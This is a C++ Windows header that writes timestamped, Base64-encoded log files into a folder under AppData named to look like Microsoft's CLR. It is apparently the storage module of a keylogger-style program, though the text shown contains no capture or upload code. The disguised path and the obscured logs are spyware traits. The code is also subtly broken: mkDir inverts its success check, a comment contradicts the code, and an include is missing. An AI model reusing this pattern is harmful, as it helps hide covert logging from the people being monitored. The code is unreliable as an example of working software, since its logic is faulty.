// ./include/headers
#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include <windows.h>
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    std::string getOurPath(const bool append_separator = false)
    {
        // Files will go to C:\Users\USERNAME\AppData\Roaming
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";

        return full + (append_separator ? "\\" : "");
    }

    bool mkOneDir(std::string path)
    {         // use std::wstring in order to use wide character strings
              // because CreateDirectory needs wide character string input
        return (bool) CreateDirectory(path.c_str(), NULL)
                      || GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool mkDir(std::string path)
    {
        for (char &c : path)
        {
            if(c == '\\')
            {
                c = '\0';
                if(mkOneDir(path))
                    return false;
                c = '\\';
            }
        }
        return true;
    }

    template <class T>
    std::string writeLog(const T &t)
    {
        std::string path = getOurPath(true);
        helper::DateTime dt;
        // cannot use ':' as separator in filenames at all, so need to change 
        // to '_' as separator instead
        std::string name = dt.getDateTimeString("_") + ".log";

        try
        {
            std::ofstream file(path + name);
            if(!file)
                return "";
            std::ostringstream s;
            s << "[" << dt.getDateTimeString() << "]" << std::endl
              << t << std::endl;
            std::string data = Base64::EncryptB64(s.str());
            file << data;
            if(!file)
                return "";
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }
    }
}

#endif // IO_H